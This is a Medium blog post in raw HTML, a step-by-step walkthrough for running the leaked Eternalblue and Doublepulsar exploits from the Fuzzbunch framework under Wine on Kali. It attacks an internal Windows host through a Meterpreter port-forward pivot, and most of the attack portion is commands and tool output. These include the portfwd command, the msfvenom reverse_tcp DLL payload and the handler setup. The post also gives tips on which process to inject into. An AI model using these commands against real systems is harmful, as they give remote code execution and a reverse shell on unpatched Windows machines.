NSA Finest Tool

Running Fuzzbunch on Kali Through a Meterpreter Port Forward<div class="ui-caption postMetaInline js-testPostMetaInlineSupplemental"><time datetime="2017-05-29T23:46:14.299Z">May 30, 2017</time><span class="middotDivider u-fontSize12"></span><span class="readingTime" title="7 min read"></span></div></div></div><p name="1d10" id="1d10" class="graf graf--p graf-after--h3">Eternalblue and the rest of the Windows exploits released by the Equation Group are built to run on Windows, not Linux. While there are people working hard to <a href="https://github.com/RiskSense-Ops/MS17-010" data-href="https://github.com/RiskSense-Ops/MS17-010" class="markup--anchor markup--p-anchor" rel="nofollow noopener" target="_blank">port the exploits over to Metasploit</a>, currently the only supported versions are x64 Windows7 and Windows 2008R2, whereas the actual Eternalblue exploit in the Equation Group leak can exploit x86 versions of 7/2008 and XP.</p><p name="0313" id="0313" class="graf graf--p graf-after--p">The Equation Group leak has been ported to Linux via wine and this new Linux friendly version can be downloaded here — <a href="https://github.com/mdiazcl/fuzzbunch-debian" data-href="https://github.com/mdiazcl/fuzzbunch-debian" class="markup--anchor markup--p-anchor" rel="nofollow noopener nofollow noopener" target="_blank">https://github.com/mdiazcl/fuzzbunch-debian</a>. Fuzzbunch is the name of the framework used that contains Eternalblue, Doublepulsar and several other exploits. I won’t go through the setup in this post since the readme in the github repo does a great job of explaining how to get this running on Kali.</p><p name="213a" id="213a" class="graf graf--p graf-after--p">In my previous post I went over how to attack internal hosts through a meterpreter session using Metasploit’s socks4a proxy services. This technique works great for most of the network based scanning and attack tools in Kali but was not effective for fuzzbunch in wine.</p><p name="d890" id="d890" class="graf graf--p graf-after--p">Another pivoting option that Metasploit offers is portfwd. Once you establish a meterpreter shell to an internal machine you can forward individual ports directly to internal hosts. The attacker machine will start listening on the port specified, with that port being bound to the running metasploit instance, which in turn forwards the traffic through the meterpreter session to whatever destination IP is defined in the portfwd command.</p><p name="70e7" id="70e7" class="graf graf--p graf-after--p">In this scenario we have the attacker -10.0.0.35 on one side of the firewall with an established meterpreter session to 192.168.55.100.</p><figure name="c71c" id="c71c" class="graf graf--figure graf-after--p"><div class="aspectRatioPlaceholder is-locked" style="max-width: 700px; max-height: 549px;"><div class="aspectRatioPlaceholder-fill" style="padding-bottom: 78.4%;"></div><div class="progressiveMedia js-progressiveMedia graf-image" data-image-id="1*YWkR0KDY3TLvNwlGoF0s9w.png" data-width="821" data-height="644" data-action="zoom" data-action-value="1*YWkR0KDY3TLvNwlGoF0s9w.png"><img src="https://cdn-images-1.medium.com/freeze/max/30/1*YWkR0KDY3TLvNwlGoF0s9w.png?q=20" crossorigin="anonymous" class="progressiveMedia-thumbnail js-progressiveMedia-thumbnail"><canvas class="progressiveMedia-canvas js-progressiveMedia-canvas"></canvas><img class="progressiveMedia-image js-progressiveMedia-image" data-src="https://cdn-images-1.medium.com/max/800/1*YWkR0KDY3TLvNwlGoF0s9w.png"><noscript class="js-progressiveMedia-inner"><img class="progressiveMedia-noscript js-progressiveMedia-inner" src="https://cdn-images-1.medium.com/max/800/1*YWkR0KDY3TLvNwlGoF0s9w.png"></noscript></div></div><figcaption class="imageCaption">Visio Depicting the Network Layout of the Scenario</figcaption></figure><p name="11de" id="11de" class="graf graf--p graf-after--figure">Once the pivot host’s externally facing service is compromised and a meterpreter shell is achieved, we need to configure portfwd to relay traffic to internal hosts. The command in this case would be:</p><pre name="9971" id="9971" class="graf graf--pre graf-after--p">portfwd add -l 9000 -p 445 -r 192.168.55.65</pre><p name="55a2" id="55a2" class="graf graf--p graf-after--pre">The breakdown of the command is like this:</p><p name="bebc" id="bebc" class="graf graf--p graf--startsWithDoubleQuote graf-after--p">“-l 9000” : The port that will receive the traffic on the attacker host</p><p name="c32b" id="c32b" class="graf graf--p graf--startsWithDoubleQuote graf-after--p">“-p 445” : The port on the internal victim that will be accessed</p><p name="6e0f" id="6e0f" class="graf graf--p graf--startsWithDoubleQuote graf-after--p">“ -r 192.168.55.65” : The internal victim</p><figure name="cd39" id="cd39" class="graf graf--figure graf-after--p"><div class="aspectRatioPlaceholder is-locked" style="max-width: 700px; max-height: 123px;"><div class="aspectRatioPlaceholder-fill" style="padding-bottom: 17.5%;"></div><div class="progressiveMedia js-progressiveMedia graf-image" data-image-id="1*wQlfph0fKZ88G__-P3N4mg.png" data-width="1137" data-height="199" data-action="zoom" data-action-value="1*wQlfph0fKZ88G__-P3N4mg.png"><img src="https://cdn-images-1.medium.com/freeze/max/30/1*wQlfph0fKZ88G__-P3N4mg.png?q=20" crossorigin="anonymous" class="progressiveMedia-thumbnail js-progressiveMedia-thumbnail"><canvas class="progressiveMedia-canvas js-progressiveMedia-canvas"></canvas><img class="progressiveMedia-image js-progressiveMedia-image" data-src="https://cdn-images-1.medium.com/max/800/1*wQlfph0fKZ88G__-P3N4mg.png"><noscript class="js-progressiveMedia-inner"><img class="progressiveMedia-noscript js-progressiveMedia-inner" src="https://cdn-images-1.medium.com/max/800/1*wQlfph0fKZ88G__-P3N4mg.png"></noscript></div></div><figcaption class="imageCaption">Pivot Machine is Exploited and portfwd is Configured for Attacking an Internal Host</figcaption></figure><p name="c76c" id="c76c" class="graf graf--p graf-after--figure">Once the the portfwd is established, the attacker machine is listening on port 9000 and anything sent to that port will reach the internal victim on the defined destination port. As our first test, we can scan the new internal victim to confirm it is vulnerable to the Eternalblue exploit by using auxiliary/scanner/smb/smb_ms17_010.</p><figure name="040b" id="040b" class="graf graf--figure graf-after--p"><div class="aspectRatioPlaceholder is-locked" style="max-width: 700px; max-height: 240px;"><div class="aspectRatioPlaceholder-fill" style="padding-bottom: 34.300000000000004%;"></div><div class="progressiveMedia js-progressiveMedia graf-image" data-image-id="1*oqwdmK9Wrv5H5fGVEyWp5w.png" data-width="1416" data-height="485" data-action="zoom" data-action-value="1*oqwdmK9Wrv5H5fGVEyWp5w.png"><img src="https://cdn-images-1.medium.com/freeze/max/30/1*oqwdmK9Wrv5H5fGVEyWp5w.png?q=20" crossorigin="anonymous" class="progressiveMedia-thumbnail js-progressiveMedia-thumbnail"><canvas class="progressiveMedia-canvas js-progressiveMedia-canvas"></canvas><img class="progressiveMedia-image js-progressiveMedia-image" data-src="https://cdn-images-1.medium.com/max/800/1*oqwdmK9Wrv5H5fGVEyWp5w.png"><noscript class="js-progressiveMedia-inner"><img class="progressiveMedia-noscript js-progressiveMedia-inner" src="https://cdn-images-1.medium.com/max/800/1*oqwdmK9Wrv5H5fGVEyWp5w.png"></noscript></div></div><figcaption class="imageCaption">Scanning The Internal Host for MS17–010 Vulnerability</figcaption></figure><p name="e1ae" id="e1ae" class="graf graf--p graf-after--figure">The traffic flow in this example is as follows:</p><figure name="ea36" id="ea36" class="graf graf--figure graf-after--p"><div class="aspectRatioPlaceholder is-locked" style="max-width: 580px; max-height: 752px;"><div class="aspectRatioPlaceholder-fill" style="padding-bottom: 129.7%;"></div><div class="progressiveMedia js-progressiveMedia graf-image" data-image-id="1*P4Jga1j8eU0oEfDTmhTV1g.png" data-width="580" data-height="752" data-is-featured="true"><img src="https://cdn-images-1.medium.com/freeze/max/30/1*P4Jga1j8eU0oEfDTmhTV1g.png?q=20" crossorigin="anonymous" class="progressiveMedia-thumbnail js-progressiveMedia-thumbnail"><canvas class="progressiveMedia-canvas js-progressiveMedia-canvas"></canvas><img class="progressiveMedia-image js-progressiveMedia-image" data-src="https://cdn-images-1.medium.com/max/800/1*P4Jga1j8eU0oEfDTmhTV1g.png"><noscript class="js-progressiveMedia-inner"><img class="progressiveMedia-noscript js-progressiveMedia-inner" src="https://cdn-images-1.medium.com/max/800/1*P4Jga1j8eU0oEfDTmhTV1g.png"></noscript></div></div></figure><p name="eb53" id="eb53" class="graf graf--p graf-after--figure">Everything is in place to start using fuzzbunch to exploit the internal host. In a new terminal on the attacker machine, start fuzzbunch by running:</p><pre name="1b2b" id="1b2b" class="graf graf--pre graf-after--p">#!/bin/bash<br>export WINEPREFIX=$HOME/.wine-fuzzbunch<br>cd $HOME/.wine-fuzzbunch/drive_c/fuzzbunch-debian/windows<br>wine cmd.exe<br>python fb.py</pre><p name="2af2" id="2af2" class="graf graf--p graf-after--pre">Once fuzzbunch has been launched you need to set the default target IP, callback IP, and project. The target and callback can be changed later and you’re not locked into using these the entire session.</p><pre name="5e12" id="5e12" class="graf graf--pre graf-after--p">[+] Set FbStorage =&gt; C:\fuzzbunch-debian\windows\storage</pre><pre name="284b" id="284b" class="graf graf--pre graf-after--pre">[*] Retargetting Session</pre><pre name="13d0" id="13d0" class="graf graf--pre graf-after--pre">[?] Default Target IP Address [] : 127.0.0.1<br>[?] Default Callback IP Address [] : 10.0.0.35<br>[?] Use Redirection [yes] :</pre><pre name="44bd" id="44bd" class="graf graf--pre graf-after--pre">[?] Base Log directory [C:\fuzzbunch-debian\logs] : <br>[*] Checking C:\fuzzbunch-debian\logs for projects<br>Index     Project                 <br>-----     -------                 <br>0         eternalblue-pivot       <br>1         testing                 <br>2         test                    <br>3         Create a New Project</pre><pre name="1fd6" id="1fd6" class="graf graf--pre graf-after--pre"><strong class="markup--strong markup--pre-strong">[?] Project [0] : 0</strong><br>[?] Set target log directory to &#39;C:\fuzzbunch-debian\logs\eternalblue-pivot\z127.0.0.1&#39;? [Yes] :</pre><pre name="69dc" id="69dc" class="graf graf--pre graf-after--pre">[*] Initializing Global State<br><strong class="markup--strong markup--pre-strong">[+] Set TargetIp =&gt; 127.0.0.1<br>[+] Set CallbackIp =&gt; 10.0.0.35</strong></pre><pre name="0cae" id="0cae" class="graf graf--pre graf-after--pre">[+] Redirection ON<br>[+] Set LogDir =&gt; C:\fuzzbunch-debian\logs\eternalblue-pivot\z127.0.0.1<br>[+] Set Project =&gt; eternalblue-pivot</pre><pre name="b292" id="b292" class="graf graf--pre graf-after--pre">fb &gt;</pre><p name="6a80" id="6a80" class="graf graf--p graf-after--pre">After that we’ll launch eternalblue, which will pull in the IP info we just entered:</p><pre name="d0fa" id="d0fa" class="graf graf--pre graf-after--p">fb &gt; use eternalblue</pre><pre name="a415" id="a415" class="graf graf--pre graf-after--pre">[!] Entering Plugin Context :: Eternalblue<br>[*] Applying Global Variables<br>[+] Set NetworkTimeout =&gt; 60<br>[+] Set TargetIp =&gt; <strong class="markup--strong markup--pre-strong">127.0.0.1</strong></pre><pre name="74e1" id="74e1" class="graf graf--pre graf-after--pre">[*] Applying Session Parameters<br>[*] Running Exploit Touches</pre><pre name="c188" id="c188" class="graf graf--pre graf-after--pre">[!] Enter Prompt Mode :: Eternalblue</pre><pre name="20fe" id="20fe" class="graf graf--pre graf-after--pre">Module: Eternalblue<br>===================</pre><pre name="48ef" id="48ef" class="graf graf--pre graf-after--pre">Name                  Value                                                 <br>----                  -----                                                 <br>NetworkTimeout        60                                                    <br>TargetIp              127.0.0.1                                             <br>TargetPort            445                                                   <br>VerifyTarget          True                                                  <br>VerifyBackdoor        True                                                  <br>MaxExploitAttempts    3                                                     <br>GroomAllocations      12                                                    <br>Target                WIN72K8R2</pre><pre name="1baf" id="1baf" class="graf graf--pre graf-after--pre">[!] plugin variables are valid<br>[?] Prompt For Variable Settings? [Yes] :</pre><p name="be8d" id="be8d" class="graf graf--p graf-after--pre">Most of the settings are defaults, but be careful when it comes time to define the target port. In this case we have to use the local port defined in the portfwd command, 9000, as Eternalblue will default to 445. Hit enter at the “Prompt for Variable Settings” prompt to enter the new target port:</p><pre name="fab0" id="fab0" class="graf graf--pre graf-after--p">[?] Prompt For Variable Settings? [Yes] :</pre><pre name="32cd" id="32cd" class="graf graf--pre graf-after--pre">[*]  NetworkTimeout :: Timeout for blocking network calls (in seconds). Use -1 for no timeout.</pre><pre name="2e2f" id="2e2f" class="graf graf--pre graf-after--pre">[?] NetworkTimeout [60] :</pre><pre name="61a9" id="61a9" class="graf graf--pre graf-after--pre">[*]  TargetIp :: Target IP Address</pre><pre name="93ed" id="93ed" class="graf graf--pre graf-after--pre">[?] TargetIp [127.0.0.1] :</pre><pre name="e36f" id="e36f" class="graf graf--pre graf-after--pre">[*]  TargetPort :: Port used by the SMB service for exploit connection</pre><pre name="8547" id="8547" class="graf graf--pre graf-after--pre"><strong class="markup--strong markup--pre-strong">[?] TargetPort [445] : 9000</strong></pre><p name="6c1a" id="6c1a" class="graf graf--p graf-after--pre">The next setting that will deviate from the defaults is the delivery mechanism. Be sure to select “Traditional deployment from within FUZZBUNCH” here:</p><pre name="8ce2" id="8ce2" class="graf graf--pre graf-after--p">[*]  Mode :: Delivery mechanism</pre><pre name="0aeb" id="0aeb" class="graf graf--pre graf-after--pre">*0) DANE     Forward deployment via DARINGNEOPHYTE<br>    1) FB       Traditional deployment from within FUZZBUNCH</pre><pre name="9f66" id="9f66" class="graf graf--pre graf-after--pre">[?] Mode [0] :1</pre><p name="970a" id="970a" class="graf graf--p graf-after--pre">At this point we’re ready to run the exploit. If everything is setup correctly you should see “WIN” when the exploit is successful. It may take more than one try, but be persistent if you’re sure the host is vulnerable:</p><figure name="25fb" id="25fb" class="graf graf--figure graf-after--p"><div class="aspectRatioPlaceholder is-locked" style="max-width: 700px; max-height: 713px;"><div class="aspectRatioPlaceholder-fill" style="padding-bottom: 101.8%;"></div><div class="progressiveMedia js-progressiveMedia graf-image" data-image-id="1*9quX4peexWCBZkXWygJMFQ.png" data-width="997" data-height="1015" data-action="zoom" data-action-value="1*9quX4peexWCBZkXWygJMFQ.png"><img src="https://cdn-images-1.medium.com/freeze/max/30/1*9quX4peexWCBZkXWygJMFQ.png?q=20" crossorigin="anonymous" class="progressiveMedia-thumbnail js-progressiveMedia-thumbnail"><canvas class="progressiveMedia-canvas js-progressiveMedia-canvas"></canvas><img class="progressiveMedia-image js-progressiveMedia-image" data-src="https://cdn-images-1.medium.com/max/800/1*9quX4peexWCBZkXWygJMFQ.png"><noscript class="js-progressiveMedia-inner"><img class="progressiveMedia-noscript js-progressiveMedia-inner" src="https://cdn-images-1.medium.com/max/800/1*9quX4peexWCBZkXWygJMFQ.png"></noscript></div></div><figcaption class="imageCaption">Eternalblue Being Run in Wine Pointing to 127.0.0.1:9000</figcaption></figure><p name="1656" id="1656" class="graf graf--p graf-after--figure">From the pivot machine we can see that traffic is being forwarded to the internal victim thanks to the meterpeter portfwd:</p><figure name="8ba0" id="8ba0" class="graf graf--figure graf-after--p"><div class="aspectRatioPlaceholder is-locked" style="max-width: 700px; max-height: 525px;"><div class="aspectRatioPlaceholder-fill" style="padding-bottom: 75%;"></div><div class="progressiveMedia js-progressiveMedia graf-image" data-image-id="1*Yr4wrPh_KW9FsA77GezcpA.png" data-width="1029" data-height="772" data-action="zoom" data-action-value="1*Yr4wrPh_KW9FsA77GezcpA.png"><img src="https://cdn-images-1.medium.com/freeze/max/30/1*Yr4wrPh_KW9FsA77GezcpA.png?q=20" crossorigin="anonymous" class="progressiveMedia-thumbnail js-progressiveMedia-thumbnail"><canvas class="progressiveMedia-canvas js-progressiveMedia-canvas"></canvas><img class="progressiveMedia-image js-progressiveMedia-image" data-src="https://cdn-images-1.medium.com/max/800/1*Yr4wrPh_KW9FsA77GezcpA.png"><noscript class="js-progressiveMedia-inner"><img class="progressiveMedia-noscript js-progressiveMedia-inner" src="https://cdn-images-1.medium.com/max/800/1*Yr4wrPh_KW9FsA77GezcpA.png"></noscript></div></div><figcaption class="imageCaption">Pivot Host Shows Traffic Being Forwarded to Target</figcaption></figure><p name="6b3e" id="6b3e" class="graf graf--p graf-after--figure">Once the Eternalblue exploit is succesful, the next step is to use the Doublepulsar module to inject a DLL of our choosing into a process on the victim. In this case we’ll run a DLL that contains a meterpreter payload to establish a reverse shell back to our attacker machine.</p><p name="b6e3" id="b6e3" class="graf graf--p graf-after--p">To generate the payload we’ll use msfvenom and to make things easier we’ll generate the payload in the directory that fuzzbunch is launched from:</p><pre name="8a38" id="8a38" class="graf graf--pre graf-after--p">root@dewey:/# <strong class="markup--strong markup--pre-strong">cd $HOME/.wine-fuzzbunch/drive_c/fuzzbunch-debian/windows</strong></pre><pre name="73b2" id="73b2" class="graf graf--pre graf-after--pre">root@dewey:~/.wine-fuzzbunch/drive_c/fuzzbunch-debian/windows# <strong class="markup--strong markup--pre-strong">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.0.0.35 lport=4444 — platform windows -f dll -o file.dll</strong></pre><pre name="e378" id="e378" class="graf graf--pre graf-after--pre">No platform was selected, choosing Msf::Module::Platform::Windows from the payload<br>No Arch selected, selecting Arch: x64 from the payload<br>No encoder or badchars specified, outputting raw payload<br>Payload size: 510 bytes<br>Final size of dll file: 5120 bytes<br><strong class="markup--strong markup--pre-strong">Saved as: file.dll</strong></pre><p name="6c0c" id="6c0c" class="graf graf--p graf-after--pre">We also need to prepare Metasploit to receive the connection from the new victim once the DLL is injected by using exploit/multi/handler, making sure the payload, lport and lhost match our msfvenom command from the previous step:</p><pre name="b3dc" id="b3dc" class="graf graf--pre graf-after--p">msf exploit(handler) &gt; show options</pre><pre name="93b5" id="93b5" class="graf graf--pre graf-after--pre">Module options (exploit/multi/handler):</pre><pre name="4d0e" id="4d0e" class="graf graf--pre graf-after--pre">Name  Current Setting  Required  Description<br>   ----  ---------------  --------  -----------</pre><pre name="1b27" id="1b27" class="graf graf--pre graf-after--pre">Payload options (<strong class="markup--strong markup--pre-strong">windows/x64/meterpreter/reverse_tcp</strong>):</pre><pre name="b57f" id="b57f" class="graf graf--pre graf-after--pre">Name      Current Setting  Required  Description<br>   ----      ---------------  --------  -----------<br>   EXITFUNC  process          yes       Exit technique (Accepted: &#39;&#39;, seh, thread, process, none)<br>   LHOST     <strong class="markup--strong markup--pre-strong">10.0.0.35</strong>        yes       The listen address<br>   LPORT     <strong class="markup--strong markup--pre-strong">4444             </strong>yes       The listen port</pre><pre name="39a7" id="39a7" class="graf graf--pre graf-after--pre">Exploit target:</pre><pre name="c7a8" id="c7a8" class="graf graf--pre graf-after--pre">Id  Name<br>   --  ----<br>   0   Wildcard Target</pre><figure name="db9a" id="db9a" class="graf graf--figure graf-after--pre"><div class="aspectRatioPlaceholder is-locked" style="max-width: 700px; max-height: 312px;"><div class="aspectRatioPlaceholder-fill" style="padding-bottom: 44.5%;"></div><div class="progressiveMedia js-progressiveMedia graf-image" data-image-id="1*gpOLtgoyBa43hhiVH_aPOw.png" data-width="1146" data-height="510" data-action="zoom" data-action-value="1*gpOLtgoyBa43hhiVH_aPOw.png"><img src="https://cdn-images-1.medium.com/freeze/max/30/1*gpOLtgoyBa43hhiVH_aPOw.png?q=20" crossorigin="anonymous" class="progressiveMedia-thumbnail js-progressiveMedia-thumbnail"><canvas class="progressiveMedia-canvas js-progressiveMedia-canvas"></canvas><img class="progressiveMedia-image js-progressiveMedia-image" data-src="https://cdn-images-1.medium.com/max/800/1*gpOLtgoyBa43hhiVH_aPOw.png"><noscript class="js-progressiveMedia-inner"><img class="progressiveMedia-noscript js-progressiveMedia-inner" src="https://cdn-images-1.medium.com/max/800/1*gpOLtgoyBa43hhiVH_aPOw.png"></noscript></div></div><figcaption class="imageCaption">Reststart the Handler In Metasploit, Matching DLL Created With Msfvenom</figcaption></figure><p name="746c" id="746c" class="graf graf--p graf-after--figure">Next, from fuzzbunch run “use doublepulsar”. The module options are pretty straightforward. Be sure that the target port matches (9000 in this case) and when it comes time to pick a process to inject into, you might get mixed results depending on what you use. Lsass.exe is the default and for meterpreter it tends to be unstable in 7/2008, with commands like hashdump and mimikatz failing frequently, but has worked well in testing with XP. I’ve been having better luck with spoolsv.exe when exploit 7/2008.</p><p name="4bc1" id="4bc1" class="graf graf--p graf-after--p">Once configured, it should look something like this:</p><pre name="2e0a" id="2e0a" class="graf graf--pre graf-after--p">Local<br>=====</pre><pre name="ecad" id="ecad" class="graf graf--pre graf-after--pre">Proto   Listen IP        Source IP        Destination IP<br>-----   --------------   --------------   --------------<br>TCP     127.0.0.1:9000   Redirector:ANY   127.0.0.1:9000</pre><pre name="f6e7" id="f6e7" class="graf graf--pre graf-after--pre">Remote<br>======</pre><pre name="7858" id="7858" class="graf graf--pre graf-after--pre">*empty*</pre><pre name="7930" id="7930" class="graf graf--pre graf-after--pre">[!] Verify Redirection Tunnels Exist<br>[?] Press Any Key To Continue :</pre><pre name="dbfd" id="dbfd" class="graf graf--pre graf-after--pre">Module: Doublepulsar<br>====================</pre><pre name="d05b" id="d05b" class="graf graf--pre graf-after--pre">Name                  Set Value                               Redirected Value    <br>----                  ---------                               ----------------    <br>NetworkTimeout        60                                                          <br>TargetIp              127.0.0.1                               127.0.0.1           <br>TargetPort            9000                                    9000                <br>DllPayload            c:\fuzzbunch-debian\windows\file.dll                        <br>DllOrdinal            1                                                           <br>ProcessName           spoolsv.exe                                                 <br>ProcessCommandLine                                                                <br>Protocol              SMB                                                         <br>Architecture          x64                                                         <br>Function              RunDLL</pre><pre name="db7f" id="db7f" class="graf graf--pre graf-after--pre">[?] Execute Plugin? [Yes] :</pre><p name="f9d3" id="f9d3" class="graf graf--p graf-after--pre">A successful DLL injection will look like this:</p><figure name="1293" id="1293" class="graf graf--figure graf-after--p"><div class="aspectRatioPlaceholder is-locked" style="max-width: 700px; max-height: 543px;"><div class="aspectRatioPlaceholder-fill" style="padding-bottom: 77.60000000000001%;"></div><div class="progressiveMedia js-progressiveMedia graf-image" data-image-id="1*MZXs8ml_y2eRQFtuJK2Hxw.png" data-width="1025" data-height="795" data-action="zoom" data-action-value="1*MZXs8ml_y2eRQFtuJK2Hxw.png"><img src="https://cdn-images-1.medium.com/freeze/max/30/1*MZXs8ml_y2eRQFtuJK2Hxw.png?q=20" crossorigin="anonymous" class="progressiveMedia-thumbnail js-progressiveMedia-thumbnail"><canvas class="progressiveMedia-canvas js-progressiveMedia-canvas"></canvas><img class="progressiveMedia-image js-progressiveMedia-image" data-src="https://cdn-images-1.medium.com/max/800/1*MZXs8ml_y2eRQFtuJK2Hxw.png"><noscript class="js-progressiveMedia-inner"><img class="progressiveMedia-noscript js-progressiveMedia-inner" src="https://cdn-images-1.medium.com/max/800/1*MZXs8ml_y2eRQFtuJK2Hxw.png"></noscript></div></div><figcaption class="imageCaption">Doublepulsar Injecting DLL</figcaption></figure><p name="9a78" id="9a78" class="graf graf--p graf-after--figure">And you should see a new meterpreter session in Metasploit:</p><figure name="85a8" id="85a8" class="graf graf--figure graf-after--p"><div class="aspectRatioPlaceholder is-locked" style="max-width: 700px; max-height: 461px;"><div class="aspectRatioPlaceholder-fill" style="padding-bottom: 65.9%;"></div><div class="progressiveMedia js-progressiveMedia graf-image" data-image-id="1*zlGlxJBZ_feXjyFOapgQAw.png" data-width="1168" data-height="770" data-action="zoom" data-action-value="1*zlGlxJBZ_feXjyFOapgQAw.png"><img src="https://cdn-images-1.medium.com/freeze/max/30/1*zlGlxJBZ_feXjyFOapgQAw.png?q=20" crossorigin="anonymous" class="progressiveMedia-thumbnail js-progressiveMedia-thumbnail"><canvas class="progressiveMedia-canvas js-progressiveMedia-canvas"></canvas><img class="progressiveMedia-image js-progressiveMedia-image" data-src="https://cdn-images-1.medium.com/max/800/1*zlGlxJBZ_feXjyFOapgQAw.png"><noscript class="js-progressiveMedia-inner"><img class="progressiveMedia-noscript js-progressiveMedia-inner" src="https://cdn-images-1.medium.com/max/800/1*zlGlxJBZ_feXjyFOapgQAw.png"></noscript></div></div><figcaption class="imageCaption">Success!</figcaption></figure><p name="d5b5" id="d5b5" class="graf graf--p graf-after--figure">In the lab scenario depicted above the machine exploited with Eternalblue was x64, but this technique is also effective against x86 hosts as well as hosts running XP:</p><figure name="e4d6" id="e4d6" class="graf graf--figure graf-after--p"><div class="aspectRatioPlaceholder is-locked" style="max-width: 700px; max-height: 791px;"><div class="aspectRatioPlaceholder-fill" style="padding-bottom: 112.99999999999999%;"></div><div class="progressiveMedia js-progressiveMedia graf-image" data-image-id="1*WbfOuYH-rH-ZkiwhxCX6LQ.png" data-width="979" data-height="1106" data-action="zoom" data-action-value="1*WbfOuYH-rH-ZkiwhxCX6LQ.png"><img src="https://cdn-images-1.medium.com/freeze/max/30/1*WbfOuYH-rH-ZkiwhxCX6LQ.png?q=20" crossorigin="anonymous" class="progressiveMedia-thumbnail js-progressiveMedia-thumbnail"><canvas class="progressiveMedia-canvas js-progressiveMedia-canvas"></canvas><img class="progressiveMedia-image js-progressiveMedia-image" data-src="https://cdn-images-1.medium.com/max/800/1*WbfOuYH-rH-ZkiwhxCX6LQ.png"><noscript class="js-progressiveMedia-inner"><img class="progressiveMedia-noscript js-progressiveMedia-inner" src="https://cdn-images-1.medium.com/max/800/1*WbfOuYH-rH-ZkiwhxCX6LQ.png"></noscript></div></div><figcaption class="imageCaption">Doublepulsar Against an x86 Victim Through a Portfwd Tunnel</figcaption></figure><h3 name="0e3a" id="0e3a" class="graf graf--h3 graf-after--figure">Reference:</h3><p name="4ebc" id="4ebc" class="graf graf--p graf-after--h3"><strong class="markup--strong markup--p-strong">mdiazcl’s Github Site With the Fuzzbunch Port to Debian:</strong></p><p name="c161" id="c161" class="graf graf--p graf-after--p"><a href="https://github.com/mdiazcl/fuzzbunch-debian" data-href="https://github.com/mdiazcl/fuzzbunch-debian" class="markup--anchor markup--p-anchor" rel="nofollow noopener nofollow noopener" target="_blank">https://github.com/mdiazcl/fuzzbunch-debian</a></p><p name="b30f" id="b30f" class="graf graf--p graf-after--p"><strong class="markup--strong markup--p-strong">Generate DLL Payload for DoublePulsar DLL Injection:</strong></p><pre name="3fcd" id="3fcd" class="graf graf--pre graf-after--p">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.0.0.35 lport=4444 — platform windows -f dll -o file.dll</pre><p name="2874" id="2874" class="graf graf--p graf-after--pre"><strong class="markup--strong markup--p-strong">Start Fuzzbunch in Wine:</strong></p><pre name="2b5a" id="2b5a" class="graf graf--pre graf-after--p">#!/bin/bash<br>export WINEPREFIX=$HOME/.wine-fuzzbunch<br>cd $HOME/.wine-fuzzbunch/drive_c/fuzzbunch-debian/windows<br>wine cmd.exe<br>python fb.py</pre><p name="80f1" id="80f1" class="graf graf--p graf-after--pre"><strong class="markup--strong markup--p-strong">Portfwd in Meterpreter:</strong></p><pre name="a7bd" id="a7bd" class="graf graf--pre graf-after--p">portfwd add -l 9000 -p 445 -r 192.168.55.65</pre><p name="dbf2" id="dbf2" class="graf graf--p graf-after--pre"><strong class="markup--strong markup--p-strong">Offensive Security Portfwd Reference:</strong></p><p name="0646" id="0646" class="graf graf--p graf-after--p graf--trailing"><a href="https://www.offensive-security.com/metasploit-unleashed/portfwd/" data-href="https://www.offensive-security.com/metasploit-unleashed/portfwd/" class="markup--anchor markup--p-anchor" rel="nofollow noopener" target="_blank">https://www.offensive-security.com/metasploit-unleashed/portfwd/</a></p></div></div></section></div><footer class="u-paddingTop10"><div class="container u-maxWidth740"><div class="row"><div class="col u-size12of12"></div></div><div class="row"><div class="col u-size12of12 js-postTags"><div class="u-paddingBottom10"><ul class="tags tags--postTags tags--borderless"><li><a class="link u-baseColor--link"   href="https://medium.com/tag/hacking?source=post" data-action-source="post">Hacking</a></li><li><a class="link u-baseColor--link"   href="https://medium.com/tag/eternalblue?source=post" data-action-source="post">Eternalblue</a></li><li><a class="link u-baseColor--link"   href="https://medium.com/tag/ms17-010?source=post" data-action-source="post">Ms17 010</a></li><li><a class="link u-baseColor--link"   href="https://medium.com/tag/fuzzbunch?source=post" data-action-source="post">Fuzzbunch</a></li></ul></div></div></div><div class="postActions js-postActionsFooter "><div class="u-flexCenter"><div class="u-flex1"><div class="multirecommend js-actionMultirecommend u-flexCenter" data-post-id="edd877dfd724" data-is-icon-29px="true" data-is-circle="true" data-has-recommend-list="true" data-source="post_actions_footer-----edd877dfd724---------------------clap_footer" data-clap-string-singular="clap" data-clap-string-plural="claps"><div class="u-relative u-foreground"><button class="button button--large button--circle button--withChrome u-baseColor--buttonNormal button--withIcon button--withSvgIcon clapButton js-actionMultirecommendButton clapButton--darker clapButton--largePill u-relative u-foreground u-xs-paddingLeft13 u-width60 u-height60 u-accentColor--textNormal u-accentColor--buttonNormal clap-onboarding"  data-action="sign-up-prompt" data-sign-in-action="multivote" data-requires-token="true" data-redirect="https://medium.com/_/vote/p/edd877dfd724" data-action-source="post_actions_footer-----edd877dfd724---------------------clap_footer" aria-label="Clap"><span class="button-defaultState"><span class="svgIcon svgIcon--clap svgIcon--33px u-relative u-topNegative2 u-xs-top0"><svg class="svgIcon-use" width="33" height="33" ><path d="M28.86 17.342l-3.64-6.402c-.292-.433-.712-.729-1.163-.8a1.124 1.124 0 0 0-.889.213c-.63.488-.742 1.181-.33 2.061l1.222 2.587 1.4 2.46c2.234 4.085 1.511 8.007-2.145 11.663-.26.26-.526.49-.797.707 1.42-.084 2.881-.683 4.292-2.094 3.822-3.823 3.565-7.876 2.05-10.395zm-6.252 11.075c3.352-3.35 3.998-6.775 1.978-10.469l-3.378-5.945c-.292-.432-.712-.728-1.163-.8a1.122 1.122 0 0 0-.89.213c-.63.49-.742 1.182-.33 2.061l1.72 3.638a.502.502 0 0 1-.806.568l-8.91-8.91a1.335 1.335 0 0 0-1.887 1.886l5.292 5.292a.5.5 0 0 1-.707.707l-5.292-5.292-1.492-1.492c-.503-.503-1.382-.505-1.887 0a1.337 1.337 0 0 0 0 1.886l1.493 1.492 5.292 5.292a.499.499 0 0 1-.353.854.5.5 0 0 1-.354-.147L5.642 13.96a1.338 1.338 0 0 0-1.887 0 1.338 1.338 0 0 0 0 1.887l2.23 2.228 3.322 3.324a.499.499 0 0 1-.353.853.502.502 0 0 1-.354-.146l-3.323-3.324a1.333 1.333 0 0 0-1.886 0 1.325 1.325 0 0 0-.39.943c0 .356.138.691.39.943l6.396 6.397c3.528 3.53 8.86 5.313 12.821 1.353zM12.73 9.26l5.68 